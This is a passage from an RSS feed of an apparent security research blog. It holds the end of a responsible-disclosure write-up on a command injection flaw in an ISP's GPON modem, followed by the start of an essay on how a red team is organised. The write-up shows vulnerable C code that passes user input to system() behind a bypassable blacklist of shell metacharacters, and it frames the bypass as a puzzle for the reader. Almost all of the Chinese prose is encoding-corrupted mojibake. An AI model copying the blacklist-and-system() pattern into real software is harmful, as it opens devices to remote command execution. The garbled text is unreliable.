class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/tmp/tmpfile.%d.%06ld&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;snprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/diag %s &amp;gt; %s 2&amp;gt;/dev/null&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ËÄå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BLACKLISTS&lt;/code&gt; ÂÆöÁæ©Â¶Ç‰∏ã:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BLACKLISTS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;|&amp;lt;&amp;gt;(){}`;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Â¶ÇÊûúÊòØ‰Ω†ÁöÑË©±ÔºåËÉΩÊÉ≥Âà∞Â¶Ç‰ΩïÁπûÈÅéÂóé?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Á≠îÊ°àÂæàÁ∞°ÂñÆÔºåÂëΩ‰ª§Ê≥®ÂÖ•ÂæÄÂæÄÂ∞±ÊòØÈÄôÈ∫ºÁöÑÁ∞°ÂñÆ‰∏îÊ®∏ÂØ¶ÁÑ°ËèØ!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191111/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôË£°ÊàëÂÄëÁ§∫ÁØÑ‰∫ÜÂ¶Ç‰ΩïÂæû PTT Áü•ÈÅìÂèóÂÆ≥ËÄÖ IP Âú∞ÂùÄÔºåÂà∞ÈÄ≤ÂÖ•ÂÆÉÊï∏ÊìöÊ©üÂØ¶ÁèæÁúüÊ≠£ÊÑèÁæ©‰∏äÁöÑ„ÄåÊåáÂì™ÊâìÂì™„Äç!&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Pq00YUoBOsQ&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÂæåË®ò&quot;&gt;ÂæåË®ò&lt;/h2&gt;

&lt;p&gt;ÊïÖ‰∫ãÂà∞ÈÄôÈÇäÂ∑Æ‰∏çÂ§öÈÄ≤ÂÖ•Â∞æËÅ≤ÔºåÊï¥ÁØáÊñáÁ´†Áúã‰ººËºïÊèèÊ∑°ÂØ´ÔºåÊèèËø∞‰∏ÄÂÄãÊºèÊ¥ûÂæûÁôºÁèæÂà∞Âà©Áî®ÁöÑÊï¥ÂÄãÁ∂ìÈÅéÔºåÂæûÁµêÊûúË´ñ‰æÜË™™‰πüË®±Âè™ÊòØ‰∏ÄÂÄãÁ∞°ÂñÆÁöÑÂëΩ‰ª§Ê≥®ÂÖ•Ôºå‰ΩÜÂØ¶Èöõ‰∏ä‰∏≠ÈñìÊâÄËä±ÁöÑÊôÇÈñì„ÄÅËµ∞ÈÅéÁöÑÊ≠™Ë∑ØÊòØÊ≠£Âú®ËÆÄÊñáÁ´†ÁöÑ‰Ω†ÁÑ°Ê≥ïÊÉ≥ÂÉèÁöÑÔºåÂ∞±ÂÉèÊòØÂú®ÈªëÊöó‰∏≠Ëµ∞Ëø∑ÂÆÆÔºåÂú®Ê≤íÊúâËµ∞Âá∫Ëø∑ÂÆÆÂâçÊ∞∏ÈÅ†‰∏çÊúÉÁü•ÈÅìËá™Â∑±Ê≠£Âú®Ëµ∞ÁöÑÈÄôÊ¢ùË∑ØÊòØ‰∏çÊòØÈÄöÂæÄÁõÆÁöÑÊ≠£Á¢∫ÈÅìË∑Ø!&lt;/p&gt;

&lt;p&gt;ÊåñÊéòÂá∫Êñ∞ÁöÑÊºèÊ¥ûÔºå‰∏¶‰∏çÊòØ‰∏Ä‰ª∂ÂÆπÊòìÁöÑ‰∫ãÔºåÂ∞§ÂÖ∂ÊòØÂú®ÂêÑÂºèÊîªÊìäÊâãÊ≥ïÂèàÂ∑≤Ë∂®ÊñºÊàêÁÜüÁöÑ‰ªäÂ§©ÔºåË¶ÅÊÉ≥Âá∫ÂÖ®Êñ∞ÁöÑÊîªÊìäÊâãÊ≥ïÊõ¥ÊòØÈõ£‰∏äÂä†Èõ£! Âú®ÊºèÊ¥ûÁ†îÁ©∂ÁöÑÈ†òÂüü‰∏äÔºåÂè∞ÁÅ£Â∞öÊú™ÊìÅÊúâË∂≥Â§†ÁöÑËÉΩÈáèÔºåÂ¶ÇÊûúÂπ≥Â∏∏ÁöÑÊåëÊà∞Â∑≤Á∂ìÊªøË∂≥‰∏ç‰∫Ü‰Ω†ÔºåÊÉ≥È´îÈ©óÁúüÂØ¶‰∏ñÁïåÁöÑÊîªÈò≤ÔºåÊ≠°ËøéÂä†ÂÖ•ËàáÊàëÂÄë‰∏ÄËµ∑‰∫§ÊµÅËïâÊµÅ :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÈÄöÂ†±ÊôÇÁ®ã&quot;&gt;ÈÄöÂ†±ÊôÇÁ®ã&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;2019 Âπ¥ 07 Êúà 28 Êó• - ÈÄèÈÅé TWCERT/CC ÂõûÂ†±‰∏≠ËèØÈõª‰ø°&lt;/li&gt;
  &lt;li&gt;2019 Âπ¥ 08 Êúà 14 Êó• - Âª†ÂïÜÂõûË¶ÜÊ∏ÖÊü•‰∏¶‰øÆË£úË®≠ÂÇô‰∏≠&lt;/li&gt;
  &lt;li&gt;2019 Âπ¥ 08 Êúà 27 Êó• - Âª†ÂïÜÂõûË¶Ü‰πùÊúàÂàù‰øÆË£úÂÆåÁï¢&lt;/li&gt;
  &lt;li&gt;2019 Âπ¥ 08 Êúà 30 Êó• - Âª†ÂïÜÂõûË¶ÜÂ∑≤ÂÆåÊàêÂèóÂΩ±ÈüøË®≠ÂÇôÁöÑÈüåÈ´îÊõ¥Êñ∞&lt;/li&gt;
  &lt;li&gt;2019 Âπ¥ 09 Êúà 11 Êó• - Âª†ÂïÜÂõûË¶ÜÈÉ®ÂàÜÁî®Êà∂ÈúÄÊ¥æÂì°Êõ¥Êñ∞, Âª∂ÂæåÂÖ¨ÈñãÊôÇÈñì&lt;/li&gt;
  &lt;li&gt;2019 Âπ¥ 09 Êúà 23 Êó• - Ëàá TWCERT/CC Á¢∫Ë™çÂèØÂÖ¨Èñã&lt;/li&gt;
  &lt;li&gt;2019 Âπ¥ 09 Êúà 25 Êó• - ÁôºË°®Ëá≥ DEVCORE CONFERENCE 2019&lt;/li&gt;
  &lt;li&gt;2019 Âπ¥ 11 Êúà 11 Êó• - ÈÉ®ËêΩÊ†ºÊñáÁ´†ÈáãÂá∫&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE/</link>
                <guid>https://devco.re/blog/2019/11/11/HiNet-GPON-Modem-RCE</guid>
                <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE Á¥ÖÈöäÁöÑÈÄ≤ÂåñÔºåËàá‰∏ã‰∏ÄÊ≠•</title>
                <description>&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;

&lt;p&gt;„ÄåÁ¥ÖÈöäÊºîÁ∑¥„ÄçËøëÂπ¥‰æÜÊº∏Êº∏ÈñãÂßãË¢´Â§ßÂÆ∂ÊèêÂèäÔºå‰πüÈñãÂßãÊúâ‰∏Ä‰∫õÂª†ÂïÜÊé®Âá∫Á¥ÖÈöäÊúçÂãô„ÄÇ‰∏çÈÅéÈóúÊñºÂú®Âè∞ÁÅ£Á¥ÖÈöäÊòØÊÄéÈ∫ºÂÅöÁöÑÂ∞±ÊØîËºÉÂ∞ë‰∫∫ÂÖ¨ÈñãÂàÜ‰∫´ÔºåË∫´ÁÇ∫Á¨¨‰∏ÄÂÄãÂú®Âè∞ÁÅ£Êé®Á¥ÖÈöäÊºîÁ∑¥ÁöÑÂÖ¨Âè∏ÔºåÊàëÊÉ≥Â∞±Ê†πÊìöÈÄôÂÖ©Âπ¥Â§ö‰æÜÁöÑÂØ¶Êà∞Á∂ìÈ©óÔºåÂàÜ‰∫´ÁÇ∫‰ªÄÈ∫ºÊàëÂÄëË¶ÅÂÅöÁ¥ÖÈöä„ÄÅÊàëÂÄëÈù¢Ëá®Âà∞ÁöÑÂïèÈ°å„ÄÅ‰ª•ÂèäÂú®ÊàëÂÄëÂøÉ‰∏≠Ë™çÁÇ∫Á¥ÖÈöäÊàêÂì°ÊáâË©≤ÂÖ∑ÂÇôÁöÑÁâπË≥™„ÄÇÊúÄÂæåÂÜçÂàÜ‰∫´ÊàëÂÄëÁèæÈöéÊÆµÁúãÂà∞ÁöÑ‰ºÅÊ•≠Ë≥áÂÆâÂïèÈ°åÔºåÊúüÊúõÊú™‰æÜÊàëÂÄë‰πüÂèØ‰ª•ÈÄèÈÅéÁ¥ÖÈöäÊºîÁ∑¥‰æÜÂπ´Âä©‰ºÅÊ•≠Ë£úË∂≥ÈÇ£‰∫õÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄô‰∏ÄÁØáÊòØÊàëÂú® &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; ÊâÄÂàÜ‰∫´ÁöÑ‰∏ªÈ°å„ÄÇÁ†îË®éÊúÉ‰∫ãÂâçË™øÊü•ÊÉ≥ËÅΩÂÖßÂÆπÊôÇÊúâ‰∫õÊúãÂèãÂ∏åÊúõÊàëÂÄëËÉΩ‰ªãÁ¥π DEVCORE ÁöÑÁ¥ÖÈöäÔºåÈÇÑÊúâÈÅã‰ΩúÊñπÂºèÂíåÊ°à‰æãÔºåÊâÄ‰ª•ÊàëÊäΩÂá∫‰∏Ä‰∫õÁ¥†ÊùêÊï¥ÁêÜÊàêÈÄôÂ†¥ÊºîË¨õ„ÄÇ‰∏ãÈù¢ÊòØÊäïÂΩ±ÁâáÈÄ£ÁµêÔºåÂÖ∂‰∏≠Êúâ‰∫õÂÖßÈÉ®Á≥ªÁµ±Áï´Èù¢‰∏çÂ∞çÂ§ñÂÖ¨ÈñãÔºåÂÉÖÂú®Á†îË®éÊúÉÂàÜ‰∫´Êï¨Ë´ãË¶ãË´í„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/conf/2019/slides/devcore-conf-2019-shaolin-DEVCORE%20%E7%B4%85%E9%9A%8A%E7%9A%84%E9%80%B2%E5%8C%96%EF%BC%8C%E8%88%87%E4%B8%8B%E4%B8%80%E6%AD%A5.pdf&quot;&gt;DEVCORE Á¥ÖÈöäÁöÑÈÄ≤ÂåñÔºåËàá‰∏ã‰∏ÄÊ≠• Ôºç Shaolin (DEVCORE CONF 2019)&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÁÇ∫‰ªÄÈ∫ºË¶ÅÁ¥ÖÈöäÊºîÁ∑¥&quot;&gt;ÁÇ∫‰ªÄÈ∫ºË¶ÅÁ¥ÖÈöäÊºîÁ∑¥Ôºü&lt;/h2&gt;

&lt;p&gt;‰∏ÄË®Ä‰ª•ËîΩ‰πãÔºåÂ∞±ÊòØÊàëÂÄëÊº∏Êº∏È´îÊúÉÂà∞Ôºö&lt;strong&gt;Â∞çÂ§ß‰ºÅÊ•≠ËÄåË®ÄÔºåÂñÆÁ¥îÁöÑÊª≤ÈÄèÊ∏¨Ë©¶‰∏¶‰∏çÊòØÊúÄÊúâÊïàÁõäÁöÑ&lt;/strong&gt;„ÄÇÂæûÈÅéÂéª‰∏äÁôæÊ¨°Êª≤ÈÄèÊ∏¨Ë©¶Á∂ìÈ©ó‰∏≠ÔºåÊàëÂÄëÂæÄÂæÄËÉΩÂú®Â∞àÊ°àÂàùÊúüÁöÑÂÅµÊü•ÈöéÊÆµÔºåÁôºÁèæ‰ºÅÊ•≠ÈÇäÁïåÂ≠òÂú®Âö¥ÈáçÂº±ÈªûÔºåÈÄ≤ËÄåÈÄ≤ÂÖ•ÂÖßÁ∂≤ÁπûÈÅéÂ±§Â±§Èò≤Á¶¶ÊîªÊìä‰∏ªË¶ÅÁõÆÊ®ô„ÄÇË∂äÊòØÈæêÂ§ßÁöÑ‰ºÅÊ•≠ÔºåÈÄôÁ®ÆÁãÄÊ≥ÅÊúÉË∂äÊòéÈ°ØÔºåÂõ†ÁÇ∫‰ªñÂÄëÈÄöÂ∏∏ÊúâÂæàÂ§öÂ∞çÂ§ñÁöÑÁ∂≤Á´ô„ÄÅÁ∂≤Ë∑ØË®≠ÂÇôÔºåÊØè‰∏ÄÂÄãÈÉΩÂèØËÉΩÊòØÈ¢®Èö™ÔºåÂç≥‰Ωø‰∏ªË¶ÅÁ∂≤Á´ôÈò≤Ë≠∑ÂæàÂÆåÂÇôÔºåÈß≠ÂÆ¢Âè™ÈúÄË¶ÅÂæûÈÄôÈ∫ºÂ§öÁõÆÊ®ô‰∏≠ÊâæÂà∞‰∏ÄÂÄãÂïèÈ°åÔºåÂ∞±ÂèØ‰ª•Â∞ç‰ºÅÊ•≠ÈÄ†ÊàêÂÇ∑ÂÆ≥„ÄÇ‰ªäÂ§©Â∞±ÁÆó‰ºÅÊ•≠Â∞çÊØèÂÄãÊúçÂãôÈÉΩÁç®Á´ãÂÅö‰∫Ü‰∏ÄÊ¨°Êª≤ÈÄèÊ∏¨Ë©¶ÔºåÂú®ÁúüÂØ¶‰∏ñÁïå‰∏≠ÔºåÈÇÑÊòØÊúâÂèØËÉΩÂæûÁ¨¨‰∏âÊñπÊúçÂãô„ÄÅÂª†ÂïÜ‰æõÊáâÈèà„ÄÅÁ§æ‰∫§Â∑•Á®ãÁ≠âÈÄîÂæëÂÖ•‰æµ„ÄÇÊâÄ‰ª•ÊúâÂèØËÉΩÊäïÊ≥®ÂæàÂ§öË≥áÊ∫êÂÅöÊ∏¨Ë©¶ÔºåÁµêÊûúÈÇÑÊòØÁôºÁîüË≥áÂÆâ‰∫ã‰ª∂„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊñºÊòØÔºåÊàëÂÄëÊé®Âá∫‰∫ÜÁ¥ÖÈöäÊºîÁ∑¥ÔºåÂ∏åÊúõÈÄèÈÅéÁúüÂØ¶ÁöÑÊºîÁ∑¥Âπ´Âä©‰ºÅÊ•≠ÊâæÂà∞Êï¥È´îÊû∂Êßã‰∏≠ËÑÜÂº±ÁöÑÂú∞Êñπ„ÄÇÂõ†Ê≠§ÔºåÈÄôÂÄãÊúçÂãôÈóúÊ≥®ÁöÑÊòØ&lt;strong&gt;‰ºÅÊ•≠Êï¥È´îÁöÑÂÆâÂÖ®ÊÄß&lt;/strong&gt;ÔºåËÄå‰∏çÂÜçÂè™ÊòØÂñÆ‰∏ÄÁöÑÁ∂≤Á´ô„ÄÇ&lt;/p&gt;

&lt;p&gt;Á¥ÖÈöäÊºîÁ∑¥ÁõÆÊ®ôÈÄöÂ∏∏ÊòØ‰∏ÄÂÄãÊÉÖÂ¢ÉÔºå‰æãÂ¶ÇÔºöÈß≠ÂÆ¢ÊúâÊ≤íÊúâËæ¶Ê≥ïÂèñÂæóÊ∞ëÁúæÂÄãË≥áÁîöËá≥ÊòØ‰ø°Áî®Âç°Âç°ËôüÔºüÂú®ÊºîÁ∑¥ÈÅéÁ®ã‰∏≠Á¥ÖÈöäÊúÉÁÑ°ÊâÄ‰∏çÁî®ÂÖ∂Ê•µÁöÑÂòóË©¶È©óË≠â‰ºÅÊ•≠Âú®‰πéÁöÑÊÉÖÂ¢ÉÊúâÊ≤íÊúâÂèØËÉΩÁôºÁîü„ÄÇ‰ª•ÂâõÂâõÁöÑ‰æãÂ≠ê‰æÜË™™ÔºåÊàëÂÄëÊúÉÊÉ≥Ëæ¶Ê≥ïÊâæÂà∞‰∏ÄÊ¢ùË∑ØÂæëÂèñÂæóÂ≠òÊîæÈÄô‰∫õË®äÊÅØÁöÑË≥áÊñôÂ∫´ÔºåÂéªÈ©óË≠âÊúâÊ≤íÊúâËæ¶Ê≥ïÂèñÂæóÂÄãË≥áÂèäÂç°Ëôü„ÄÇ‰∏ÄËà¨‰æÜË™™ÔºåÂç°ËôüÈÉ®ÂàÜÈÉΩÊúÉÁ∂ìÈÅéÂä†ÂØÜÔºåÂõ†Ê≠§Âú®Êãø‰∏ãË≥áÊñôÂ∫´ÂæåÊàëÂÄë‰πüÊúÉÂòóË©¶ÁúãÁúãÊúâÊ≤íÊúâËæ¶Ê≥ïÈÇÑÂéüÈÄô‰∫õÂç°Ëôü„ÄÇÊúâÊôÇÂÄôÈô§‰∫ÜÊâæÂà∞ÈÇÑÂéüÁöÑÊñπÊ≥ïÔºåÊàëÂÄëÁîöËá≥ÊúÉÂú®ÈÅéÁ®ã‰∏≠ÁôºÁèæÂÖ∂‰ªñË∑ØÂæëÂèØÂèñÂæóÂç°ËôüÔºåÂèØËÉΩÊòØÂ∑•Á®ãÂ∏´ÁöÑ debug Ë≥áË®äÊúÉË®òÈåÑÂç°ËôüÔºåÊàñÊòØÂÇô‰ªΩÊ™îÂú® NAS Ë£°Èù¢ÊúâÂÆåÊï¥Âç°ËôüÔºåÈÄô‰∫õÂèØËÉΩÊòØÈÄ£Ë≥áÂÆâË≤†Ë≤¨‰∫∫ÈÉΩ‰∏çÁü•ÈÅìÁöÑË≥áË®äÔºå‰πüÊòØ‰ºÅÊ•≠Ë©ï‰º∞È¢®Èö™ÁöÑÁõ≤Èªû„ÄÇ&lt;/p&gt;

&lt;p&gt;Âà∞ÈÄôÈÇäÔºåÁ¥ÖÈöäÊºîÁ∑¥ÁöÑÊïàÁõäÂ∞±ÂæàÊòéÈ°Ø‰∫ÜÔºåÁ¥ÖÈöäËÉΩÂçîÂä©‰ºÅÊ•≠ÂÖ®Áõ§Ë©ï‰º∞ÊΩõÂú®ÁöÑÈáçÂ§ßÈ¢®Èö™Ôºå‰∏çÂÜçÂÉèÈÅéÂéªÂè™ÊòØÂñÆ‰∏ÄÈù¢ÂêëÁöÑÊ∏¨Ë©¶ÁâπÂÆöÁ∂≤Á´ô„ÄÇÈô§‰∫ÜÊâæÂà∞Âº±ÈªûÔºåÁ¥ÖÈöäÊõ¥Âú®‰πéÂπ´‰ºÅÊ•≠&lt;strong&gt;È©óË≠âÂÖ•‰æµÁöÑÂèØË°åÊÄß&lt;/strong&gt;ÔºåÊñπ‰æø‰ºÅÊ•≠Ë©ï‰º∞È¢®Èö™‰ª•ÂèäÊì¨ÂÆöÈò≤Á¶¶Á≠ñÁï•„ÄÇÊúÄÂæåÔºåÁ¥ÖÈöäÂæÄÂæÄ‰πüËÉΩÂ§†Âú®ÊºîÁ∑¥ÈÅéÁ®ãÁï∂‰∏≠&lt;strong&gt;ÊâæÂá∫‰ºÅÊ•≠È¢®Èö™Ë©ï‰º∞ÂøΩÁï•ÁöÑÂú∞Êñπ&lt;/strong&gt;Ôºå‰æãÂ¶ÇÂâõÂâõ‰æãÂ≠êÊèêÂà∞ÁöÑÂÇô‰ªΩ NASÔºåÂ∞±ÂèØËÉΩÊòØÊ≤íÊúâÂàóÂÖ•Ê†∏ÂøÉÁ≥ªÁµ±‰ΩÜÂèàÁõ∏Áï∂ÈáçË¶ÅÁöÑ‰º∫ÊúçÂô®ÔºåÈÄô‰∏ÄÂ°ä‰πüÊòØ DEVCORE ÈÄôÂπæÂπ¥‰æÜÁ¢∫ÂØ¶Âπ´Âä©Âà∞ÂÆ¢Êà∂ÁöÑÂú∞Êñπ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;devcore-Á¥ÖÈöäÁöÑÁ∑®Âà∂&quot;&gt;DEVCORE Á¥ÖÈöäÁöÑÁ∑®Âà∂&lt;/h2&gt;

&lt;p&gt;Âü∫Êú¨‰∏äÔºåDEVCORE ÁöÑÁ¥ÖÈöäÊàêÂì°ÈÉΩÊòØÂèØ‰ª•Áç®Áï∂‰∏ÄÈù¢ÁöÑÔºåÂú®Âü∑Ë°å‰∏ÄËà¨Â∞àÊ°àÊôÇÊàêÂì°Èñì‰∏¶Ê≤íÊúâÈ°ØËëóÂ∑ÆÁï∞„ÄÇ‰ΩÜÂú®ÊºîÁ∑¥ÁØÑÂúçÊØîËºÉÂ§ßÁöÑÁãÄÊ≥Å‰∏ãÔºåÂ∞±ÊúÉÈñãÂßãÊúâÊòéÈ°ØÁöÑÂàÜÂ∑•‰ΩúÊ•≠ÔºåÂêÑÁµÑ‰πüÊúÉÂ∞àÁ≤æÊäÄËÉΩÂ¢ûÂä†ÂúòÈöäÊïàÁéá„ÄÇÁõÆÂâçÊàëÂÄëÁöÑÁ∑®Âà∂ÂÖ±ÂàÜÁÇ∫‰∫îÁµÑÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20191024/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Á∞°ÂñÆ‰ªãÁ¥πËÅ∑Ë≤¨Â¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Intelligence (ÂÅµÊü•)ÔºåË≤†Ë≤¨ÊÉÖÂ†±ÂÅµÊü•Ôºå‰ªñÂÄëÊúÉÂéªÊî∂ÈõÜË∑üÁõÆÊ®ôÊúâÈóúÁöÑÊâÄÊúâË≥áË®äÔºåÂåÖÊã¨ IP Á∂≤ÊÆµ„ÄÅÁ∂≤Á´ôÂÄãÂà•‰ΩøÁî®ÁöÑÊäÄË°ìÔºåÁîöËá≥ÊòØÊ¥©ÊºèÁöÑÂ∏≥ËôüÂØÜÁ¢º„ÄÇ&lt;/li&gt;
  &lt;li&gt;Special Force (ÁâπÊîª)ÔºåÊúâÊØîËºÉÂº∑Â§ßÁöÑÊîªÊìäËÉΩÂäõÔºå‰∏ªË¶ÅË≤†Ë≤¨ÊâìÁ†¥ÁèæÊ≥ÅÔºå‰æãÂ¶ÇÊîª‰∏ãÁ¨¨‰∏ÄÂÄãÊìöÈªû„ÄÅÊãø‰∏ãÂè¶‰∏ÄÂÄãÁ∂≤ÊÆµ„ÄÅÊàñÊòØ‰∏ªÊ©üÁöÑÊèêÊ¨ä„ÄÇ&lt;/li&gt;
  &lt;li&gt;Regular Army (Â∏∏Ë¶è)ÔºåË≤†Ë≤¨Êãø‰∏ãÊìöÈªûÂæåÊéÉËï©Êï¥ÂÄãÊà∞Â†¥ÔºåÂòóË©¶Ê©´ÂêëÁßªÂãïÔºåÊúÉÁõ°ÈáèÂ§öÂª∫Á´ãÂπæÂÄãÊìöÈªûËÆìÁâπÊîªÁµÑÊúâÊõ¥Â§öË≥áÊ∫êÊúù‰ªªÂãôÁõÆÊ®ôÈÇÅÈÄ≤„ÄÇ&lt;/li&gt;
  &lt;li&gt;Support (ÊîØÊè¥)ÔºåÈáçË¶ÅÁöÑÂæåÂã§Â∑•‰ΩúÔºåÁ∂≠ÊåÅÊìöÈªûÁöÑÂèØÁî®ÊÄßÔºåÂêåÊôÇ‰πüË¶ÅËßÄÂØüË®òÈåÑÊï¥ÂÄãÊà∞Ê≥ÅÔºåÊúÄÊ∏ÖÊ•öÂÖ®Â±ÄÊà∞Ê≥Å„ÄÇ&lt;/li&gt;
  &lt;li&gt;Research (Á†îÁ©∂)ÔºåÂπ≥ÊôÇÁ†îÁ©∂ÂêÑÁ®ÆÂú®Á¥ÖÈöä‰∏≠ÊúÉÁî®Âà∞ÁöÑÊäÄË°ìÔºåÊºîÁ∑¥ÊôÇÊúüÁ¢∞Âà∞ÂÖ∑Êà∞Áï•ÂÉπÂÄºÁöÑÁ≥ªÁµ±ÔºåÊúÉÊäïÂÖ•Ë≥áÊ∫êÈñãÊé° 0-day„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;devcore-Á¥ÖÈöäÁöÑÈÄ≤Âåñ&quot;&gt;DEVCORE Á¥ÖÈöäÁöÑÈÄ≤Âåñ&lt;/h2&gt;

&lt;p&gt;ÊâÄË¨ÇÁöÑÈÄ≤ÂåñÔºåÂ∞±ÊòØÁ¢∞Âà∞‰∫ÜÂïèÈ°åÔºåÊÉ≥Ëæ¶Ê≥ïÂº∑Âåñ‰∏¶‰∏îËß£Ê±∫ÔºåÈÇ£ÊàëÂÄëÈÅáÂà∞‰∫ÜÂì™‰∫õÂïèÈ°åÂë¢Ôºü&lt;/p&gt;

&lt;h3 id=&quot;Â¶Ç‰ΩïÊâæÂà∞‰∏ÄÂÄãÁ™ÅÁ†¥Èªû&quot;&gt;Â¶Ç‰ΩïÊâæÂà∞‰∏ÄÂÄãÁ™ÅÁ†¥ÈªûÔºü&lt;/h3&gt;

&lt;p&gt;ÈÄôÊòØÂ§ßÂÆ∂ÊúÄÂ∏∏Á¢∞Âà∞ÁöÑÂïèÈ°åÔºåËê¨‰∫ãËµ∑È†≠Èõ£ÔºåÊÄéÈ∫ºÊ®£ÊâæÂà∞Á¨¨‰∏ÄÂÄãÁ™ÅÁ†¥ÈªûÔºüÈÄôÂÄãÂïèÈ°åÂú®Á¥ÖÈöäÊºîÁ∑¥Áï∂‰∏≠Èõ£Â∫¶ÊúÉÊõ¥È´òÔºåÂõ†ÁÇ∫ÊúâË¶èÊ®°ÁöÑ‰ºÅÊ•≠Êó©Â∑≤ÊäïÂÖ•Ë≥áÊ∫êÂú®Ë≥áÂÆâÊ™¢Ê∏¨ÂíåÈò≤Ë≠∑‰∏äÔºåÊàëÂÄëË¶ÅÊÄéÈ∫ºÊ®£ÂæûÂ±§Â±§Èò≤Á¶¶Áï∂‰∏≠ÊâæÂà∞Âº±ÈªûÔºüË¶ÅËÉΩÊâæÂà∞Âà•‰∫∫Êâæ‰∏çÂà∞ÁöÑÂº±ÈªûÔºåÊ∏¨Ë©¶ÊÄùÁ∂≠ÂíåÊñπÊ≥ï‰∏ÄÂÆöË¶ÅË∑üÂà•‰∫∫‰∏ç‰∏ÄÊ®£„ÄÇÊñºÊòØÔºåÊàëÂÄëÊäïÂÖ•Ë≥áÊ∫êÂú®ÂÅµÊü•„ÄÅÁâπÊîª„